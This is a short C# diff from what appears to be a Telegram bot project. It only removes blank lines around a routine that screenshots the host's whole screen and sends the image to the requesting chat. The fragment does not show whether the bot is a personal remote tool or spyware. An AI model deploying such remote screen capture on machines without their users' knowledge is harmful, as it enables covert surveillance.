@@ -172,12 +172,10 @@ namespace Telegram_bot
             {
                 Rectangle bounds = new Rectangle(0,0,1600,900);
                 Bitmap screenshot = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb);
-
                 using (Graphics graphics = Graphics.FromImage(screenshot))
                 {
                     graphics.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                 }
-
                 screenshot.Save("screenshot.png", ImageFormat.Png);
 
                 return SendFile(update.Message.Chat.Id.ToString(), ".\\", "screenshot.png").Result;
